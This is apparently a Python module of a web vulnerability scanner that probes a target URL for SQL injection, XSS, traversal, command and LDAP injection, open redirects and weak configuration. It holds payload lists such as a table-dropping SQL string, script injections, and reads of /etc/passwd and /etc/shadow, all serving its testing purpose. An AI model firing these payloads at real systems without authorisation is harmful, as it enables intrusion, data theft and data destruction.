"""
Vulnerability scanning modules for different attack vectors
"""

import requests
import re
import ssl
import socket
import urllib.parse
from urllib3.exceptions import InsecureRequestWarning
import warnings

# Suppress SSL warnings for testing
warnings.filterwarnings('ignore', category=InsecureRequestWarning)


class VulnerabilityScanner:
    """
    Comprehensive vulnerability scanner with multiple attack vector detection
    """
    
    def __init__(self):
        self.session = requests.Session()
        self.session.verify = False
        self.timeout = 10
        self.session.headers.update({
            'User-Agent': 'Cyber-Wolf-Hunter/1.0 Security Scanner'
        })
    
    def check_sql_injection(self, target_url):
        """Check for SQL injection vulnerabilities"""
        vulnerabilities = []
        
        # SQL injection payloads
        sql_payloads = [
            "' OR '1'='1",
            "' OR 1=1--",
            "' UNION SELECT NULL--",
            "'; DROP TABLE users--",
            "' OR 'x'='x",
            "1' AND '1'='1",
            "admin'--",
            "' OR 1=1#"
        ]
        
        # Test common parameters
        test_params = ['id', 'user', 'search', 'q', 'username', 'email', 'page']
        
        for param in test_params:
            for payload in sql_payloads:
                try:
                    test_url = f"{target_url}?{param}={urllib.parse.quote(payload)}"
                    response = self.session.get(test_url)
                    
                    # Check for SQL error patterns
                    sql_errors = [
                        'mysql_fetch_array', 'mysql_num_rows', 'mysql_error',
                        'Warning: mysql', 'MySQLSyntaxErrorException',
                        'valid MySQL result', 'PostgreSQL query failed',
                        'Warning: pg_', 'valid PostgreSQL result',
                        'SQLite/JDBCDriver', 'SQLite.Exception',
                        'Microsoft OLE DB Provider for ODBC Drivers',
                        'Microsoft OLE DB Provider for SQL Server',
                        'Unclosed quotation mark after the character string',
                        'Microsoft JET Database Engine'
                    ]
                    
                    for error in sql_errors:
                        if error.lower() in response.text.lower():
                            vulnerabilities.append({
                                'type': 'SQL Injection',
                                'severity': 'High',
                                'risk_level': 'high',
                                'url': test_url,
                                'payload': payload,
                                'parameter': param,
                                'description': f'Potential SQL injection in parameter "{param}"',
                                'evidence': error,
                                'recommendation': 'Use parameterized queries and input validation'
                            })
                            break
                            
                except Exception as e:
                    continue
        
        return vulnerabilities
    
    def check_xss(self, target_url):
        """Check for Cross-Site Scripting vulnerabilities"""
        vulnerabilities = []
        
        xss_payloads = [
            '<script>alert("XSS")</script>',
            '<img src=x onerror=alert("XSS")>',
            '<svg onload=alert("XSS")>',
            '"><script>alert("XSS")</script>',
            "';alert('XSS');//",
            '<iframe src="javascript:alert(\'XSS\')">',
            '<body onload=alert("XSS")>',
            '<input type="text" value="" onmouseover="alert(\'XSS\')">'
        ]
        
        test_params = ['q', 'search', 'query', 'input', 'comment', 'message', 'name']
        
        for param in test_params:
            for payload in xss_payloads:
                try:
                    test_url = f"{target_url}?{param}={urllib.parse.quote(payload)}"
                    response = self.session.get(test_url)
                    
                    # Check if payload is reflected in response
                    if payload in response.text or payload.replace('"', '&quot;') in response.text:
                        vulnerabilities.append({
                            'type': 'Cross-Site Scripting (XSS)',
                            'severity': 'High',
                            'risk_level': 'high',
                            'url': test_url,
                            'payload': payload,
                            'parameter': param,
                            'description': f'Reflected XSS vulnerability in parameter "{param}"',
                            'evidence': 'Payload reflected in response',
                            'recommendation': 'Implement proper input validation and output encoding'
                        })
                        break
                        
                except Exception as e:
                    continue
        
        return vulnerabilities
    
    def check_directory_traversal(self, target_url):
        """Check for directory traversal vulnerabilities"""
        vulnerabilities = []
        
        traversal_payloads = [
            '../../../etc/passwd',
            '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
            '../../../windows/win.ini',
            '../../../../etc/shadow',
            '../../../boot.ini',
            '..%2F..%2F..%2Fetc%2Fpasswd',
            '....//....//....//etc/passwd'
        ]
        
        test_params = ['file', 'path', 'page', 'include', 'doc', 'document']
        
        for param in test_params:
            for payload in traversal_payloads:
                try:
                    test_url = f"{target_url}?{param}={urllib.parse.quote(payload)}"
                    response = self.session.get(test_url)
                    
                    # Check for file system indicators
                    file_indicators = [
                        'root:x:0:0:', '[boot loader]', '[fonts]',
                        'daemon:x:', 'bin:x:', 'sys:x:'
                    ]
                    
                    for indicator in file_indicators:
                        if indicator in response.text:
                            vulnerabilities.append({
                                'type': 'Directory Traversal',
                                'severity': 'High',
                                'risk_level': 'high',
                                'url': test_url,
                                'payload': payload,
                                'parameter': param,
                                'description': f'Directory traversal vulnerability in parameter "{param}"',
                                'evidence': indicator,
                                'recommendation': 'Implement proper path validation and access controls'
                            })
                            break
                            
                except Exception as e:
                    continue
        
        return vulnerabilities
    
    def check_open_redirect(self, target_url):
        """Check for open redirect vulnerabilities"""
        vulnerabilities = []
        
        redirect_payloads = [
            'http://evil.com',
            'https://google.com',
            '//evil.com',
            '/\\evil.com',
            'javascript:alert("redirect")'
        ]
        
        test_params = ['redirect', 'url', 'next', 'return', 'goto', 'target']
        
        for param in test_params:
            for payload in redirect_payloads:
                try:
                    test_url = f"{target_url}?{param}={urllib.parse.quote(payload)}"
                    response = self.session.get(test_url, allow_redirects=False)
                    
                    # Check for redirect response
                    if response.status_code in [301, 302, 303, 307, 308]:
                        location = response.headers.get('Location', '')
                        if payload in location or 'evil.com' in location or 'google.com' in location:
                            vulnerabilities.append({
                                'type': 'Open Redirect',
                                'severity': 'Medium',
                                'risk_level': 'medium',
                                'url': test_url,
                                'payload': payload,
                                'parameter': param,
                                'description': f'Open redirect vulnerability in parameter "{param}"',
                                'evidence': f'Redirects to: {location}',
                                'recommendation': 'Validate redirect URLs against whitelist'
                            })
                            
                except Exception as e:
                    continue
        
        return vulnerabilities
    
    def check_csrf(self, target_url):
        """Check for CSRF protection"""
        vulnerabilities = []
        
        try:
            response = self.session.get(target_url)
            
            # Check for CSRF tokens in forms
            csrf_patterns = [
                r'<input[^>]*name=["\']?csrf[^"\']*["\']?[^>]*>',
                r'<input[^>]*name=["\']?_token[^"\']*["\']?[^>]*>',
                r'<input[^>]*name=["\']?authenticity_token[^"\']*["\']?[^>]*>'
            ]
            
            has_csrf_token = False
            for pattern in csrf_patterns:
                if re.search(pattern, response.text, re.IGNORECASE):
                    has_csrf_token = True
                    break
            
            # Check for forms without CSRF protection
            forms = re.findall(r'<form[^>]*>(.*?)</form>', response.text, re.DOTALL | re.IGNORECASE)
            for form in forms:
                if 'method="post"' in form.lower() and not has_csrf_token:
                    vulnerabilities.append({
                        'type': 'CSRF Vulnerability',
                        'severity': 'Medium',
                        'risk_level': 'medium',
                        'url': target_url,
                        'description': 'Form lacks CSRF protection',
                        'evidence': 'POST form without CSRF token detected',
                        'recommendation': 'Implement CSRF tokens in all state-changing forms'
                    })
                    break
                    
        except Exception as e:
            pass
        
        return vulnerabilities
    
    def check_info_disclosure(self, target_url):
        """Check for information disclosure"""
        vulnerabilities = []
        
        # Test for sensitive files
        sensitive_files = [
            '/robots.txt', '/.env', '/config.php', '/phpinfo.php',
            '/admin/', '/backup/', '/.git/', '/debug/',
            '/test/', '/tmp/', '/temp/', '/.htaccess'
        ]
        
        for file_path in sensitive_files:
            try:
                test_url = target_url + file_path
                response = self.session.get(test_url)
                
                if response.status_code == 200:
                    # Check content for sensitive information
                    sensitive_content = [
                        'password', 'secret', 'api_key', 'database',
                        'mysql', 'root', 'admin', 'config'
                    ]
                    
                    content_lower = response.text.lower()
                    for content in sensitive_content:
                        if content in content_lower:
                            vulnerabilities.append({
                                'type': 'Information Disclosure',
                                'severity': 'Medium',
                                'risk_level': 'medium',
                                'url': test_url,
                                'description': f'Sensitive file accessible: {file_path}',
                                'evidence': f'Contains: {content}',
                                'recommendation': 'Restrict access to sensitive files'
                            })
                            break
                            
            except Exception as e:
                continue
        
        return vulnerabilities
    
    def check_security_headers(self, target_url):
        """Check for missing security headers"""
        vulnerabilities = []
        
        try:
            response = self.session.get(target_url)
            headers = response.headers
            
            # Important security headers
            security_headers = {
                'X-Content-Type-Options': 'nosniff',
                'X-Frame-Options': 'DENY or SAMEORIGIN',
                'X-XSS-Protection': '1; mode=block',
                'Strict-Transport-Security': 'HSTS enabled',
                'Content-Security-Policy': 'CSP configured'
            }
            
            for header, description in security_headers.items():
                if header not in headers:
                    vulnerabilities.append({
                        'type': 'Missing Security Header',
                        'severity': 'Low',
                        'risk_level': 'low',
                        'url': target_url,
                        'description': f'Missing {header} header',
                        'evidence': f'Header not present: {header}',
                        'recommendation': f'Add {header} header for {description}'
                    })
                    
        except Exception as e:
            pass
        
        return vulnerabilities
    
    def check_ssl_config(self, target_url):
        """Check SSL/TLS configuration"""
        vulnerabilities = []
        
        if not target_url.startswith('https://'):
            vulnerabilities.append({
                'type': 'SSL/TLS Configuration',
                'severity': 'Medium',
                'risk_level': 'medium',
                'url': target_url,
                'description': 'Site not using HTTPS',
                'evidence': 'HTTP protocol detected',
                'recommendation': 'Implement HTTPS with valid SSL certificate'
            })
            return vulnerabilities
        
        try:
            hostname = urllib.parse.urlparse(target_url).hostname
            context = ssl.create_default_context()
            
            with socket.create_connection((hostname, 443), timeout=10) as sock:
                with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                    cert = ssock.getpeercert()
                    
                    # Check certificate validity
                    import datetime
                    if cert and 'notAfter' in cert:
                        try:
                            not_after = datetime.datetime.strptime(cert['notAfter'], '%b %d %H:%M:%S %Y %Z')
                            
                            if not_after < datetime.datetime.now():
                                vulnerabilities.append({
                                    'type': 'SSL/TLS Configuration',
                                    'severity': 'High',
                                    'risk_level': 'high',
                                    'url': target_url,
                                    'description': 'SSL certificate expired',
                                    'evidence': f'Certificate expired on: {cert["notAfter"]}',
                                    'recommendation': 'Renew SSL certificate'
                                })
                        except (ValueError, KeyError):
                            pass
                        
        except Exception as e:
            vulnerabilities.append({
                'type': 'SSL/TLS Configuration',
                'severity': 'Medium',
                'risk_level': 'medium',
                'url': target_url,
                'description': 'SSL configuration error',
                'evidence': str(e),
                'recommendation': 'Check SSL certificate configuration'
            })
        
        return vulnerabilities
    
    def check_directory_enum(self, target_url):
        """Check for directory enumeration"""
        vulnerabilities = []
        
        common_dirs = [
            '/admin', '/administrator', '/wp-admin', '/phpmyadmin',
            '/cpanel', '/control', '/manager', '/login', '/dashboard'
        ]
        
        for directory in common_dirs:
            try:
                test_url = target_url + directory
                response = self.session.get(test_url)
                
                if response.status_code == 200:
                    vulnerabilities.append({
                        'type': 'Directory Enumeration',
                        'severity': 'Low',
                        'risk_level': 'low',
                        'url': test_url,
                        'description': f'Accessible directory found: {directory}',
                        'evidence': f'HTTP {response.status_code} response',
                        'recommendation': 'Restrict access to administrative directories'
                    })
                    
            except Exception as e:
                continue
        
        return vulnerabilities
    
    def check_file_upload(self, target_url):
        """Check for file upload vulnerabilities"""
        vulnerabilities = []
        
        try:
            response = self.session.get(target_url)
            
            # Look for file upload forms
            upload_patterns = [
                r'<input[^>]*type=["\']?file["\']?[^>]*>',
                r'enctype=["\']?multipart/form-data["\']?'
            ]
            
            for pattern in upload_patterns:
                if re.search(pattern, response.text, re.IGNORECASE):
                    vulnerabilities.append({
                        'type': 'File Upload',
                        'severity': 'Medium',
                        'risk_level': 'medium',
                        'url': target_url,
                        'description': 'File upload functionality detected',
                        'evidence': 'File upload form found',
                        'recommendation': 'Implement file type validation and size limits'
                    })
                    break
                    
        except Exception as e:
            pass
        
        return vulnerabilities
    
    def check_server_info(self, target_url):
        """Check for server information disclosure"""
        vulnerabilities = []
        
        try:
            response = self.session.get(target_url)
            headers = response.headers
            
            # Check for server information disclosure
            sensitive_headers = {
                'Server': 'Server version information disclosed',
                'X-Powered-By': 'Technology stack information disclosed',
                'X-AspNet-Version': 'ASP.NET version disclosed',
                'X-Generator': 'CMS/Framework information disclosed'
            }
            
            for header, description in sensitive_headers.items():
                if header in headers:
                    vulnerabilities.append({
                        'type': 'Server Information Disclosure',
                        'severity': 'Low',
                        'risk_level': 'low',
                        'url': target_url,
                        'description': description,
                        'evidence': f'{header}: {headers[header]}',
                        'recommendation': f'Remove or mask {header} header'
                    })
                    
        except Exception as e:
            pass
        
        return vulnerabilities
    
    def check_cookie_security(self, target_url):
        """Check for cookie security issues"""
        vulnerabilities = []
        
        try:
            response = self.session.get(target_url)
            cookies = response.cookies
            
            for cookie in cookies:
                issues = []
                
                # Check for missing security flags
                if not cookie.secure:
                    issues.append('Missing Secure flag')
                if 'HttpOnly' not in str(cookie):
                    issues.append('Missing HttpOnly flag')
                if 'SameSite' not in str(cookie):
                    issues.append('Missing SameSite attribute')
                
                if issues:
                    vulnerabilities.append({
                        'type': 'Cookie Security',
                        'severity': 'Medium',
                        'risk_level': 'medium',
                        'url': target_url,
                        'description': f'Insecure cookie: {cookie.name}',
                        'evidence': ', '.join(issues),
                        'recommendation': 'Set Secure, HttpOnly, and SameSite attributes'
                    })
                    
        except Exception as e:
            pass
        
        return vulnerabilities
    
    def check_auth_bypass(self, target_url):
        """Check for authentication bypass vulnerabilities"""
        vulnerabilities = []
        
        # Common authentication bypass payloads
        bypass_payloads = [
            'admin\' --',
            'admin\' #',
            'admin\'/*',
            'admin\' OR \'1\'=\'1',
            '\'OR 1=1--',
            '\' or 1=1#',
            '\' or 1=1/*'
        ]
        
        auth_params = ['username', 'user', 'login', 'email', 'userid']
        
        for param in auth_params:
            for payload in bypass_payloads:
                try:
                    test_data = {param: payload, 'password': 'test'}
                    response = self.session.post(target_url, data=test_data)
                    
                    # Check for successful authentication indicators
                    success_indicators = [
                        'dashboard', 'welcome', 'logout', 'profile',
                        'admin panel', 'control panel', 'authenticated'
                    ]
                    
                    content_lower = response.text.lower()
                    for indicator in success_indicators:
                        if indicator in content_lower:
                            vulnerabilities.append({
                                'type': 'Authentication Bypass',
                                'severity': 'High',
                                'risk_level': 'high',
                                'url': target_url,
                                'payload': payload,
                                'parameter': param,
                                'description': f'Potential authentication bypass in {param}',
                                'evidence': f'Success indicator found: {indicator}',
                                'recommendation': 'Implement proper authentication validation'
                            })
                            break
                            
                except Exception as e:
                    continue
        
        return vulnerabilities
    
    def check_command_injection(self, target_url):
        """Check for command injection vulnerabilities"""
        vulnerabilities = []
        
        # Command injection payloads
        cmd_payloads = [
            '; id',
            '| id',
            '&& id',
            '`id`',
            '$(id)',
            '; cat /etc/passwd',
            '| cat /etc/passwd',
            '; ping -c 1 127.0.0.1',
            '| ping -c 1 127.0.0.1'
        ]
        
        test_params = ['cmd', 'command', 'exec', 'system', 'ping', 'host', 'ip']
        
        for param in test_params:
            for payload in cmd_payloads:
                try:
                    test_url = f"{target_url}?{param}={urllib.parse.quote(payload)}"
                    response = self.session.get(test_url)
                    
                    # Check for command execution indicators
                    cmd_indicators = [
                        'uid=', 'gid=', 'groups=',  # id command output
                        'root:x:0:0:', 'daemon:x:',  # /etc/passwd content
                        'PING', 'ping statistics',   # ping command output
                        '64 bytes from', 'packets transmitted'
                    ]
                    
                    for indicator in cmd_indicators:
                        if indicator in response.text:
                            vulnerabilities.append({
                                'type': 'Command Injection',
                                'severity': 'High',
                                'risk_level': 'high',
                                'url': test_url,
                                'payload': payload,
                                'parameter': param,
                                'description': f'Command injection in parameter {param}',
                                'evidence': indicator,
                                'recommendation': 'Sanitize input and use parameterized commands'
                            })
                            break
                            
                except Exception as e:
                    continue
        
        return vulnerabilities
    
    def check_ldap_injection(self, target_url):
        """Check for LDAP injection vulnerabilities"""
        vulnerabilities = []
        
        # LDAP injection payloads
        ldap_payloads = [
            '*',
            '*)(&',
            '*)(|(&',
            '*))(|',
            '*))%00',
            '*)(cn=*))((cn=*',
            '*)(uid=*))(|(uid=*',
            '*)(&(objectClass=*'
        ]
        
        test_params = ['username', 'user', 'uid', 'cn', 'search', 'filter']
        
        for param in test_params:
            for payload in ldap_payloads:
                try:
                    test_url = f"{target_url}?{param}={urllib.parse.quote(payload)}"
                    response = self.session.get(test_url)
                    
                    # Check for LDAP error patterns
                    ldap_errors = [
                        'Invalid DN syntax',
                        'LDAP: error code',
                        'javax.naming.directory',
                        'LDAPException',
                        'com.sun.jndi.ldap',
                        'Invalid search filter'
                    ]
                    
                    for error in ldap_errors:
                        if error in response.text:
                            vulnerabilities.append({
                                'type': 'LDAP Injection',
                                'severity': 'High',
                                'risk_level': 'high',
                                'url': test_url,
                                'payload': payload,
                                'parameter': param,
                                'description': f'LDAP injection in parameter {param}',
                                'evidence': error,
                                'recommendation': 'Use parameterized LDAP queries and input validation'
                            })
                            break
                            
                except Exception as e:
                    continue
        
        return vulnerabilities
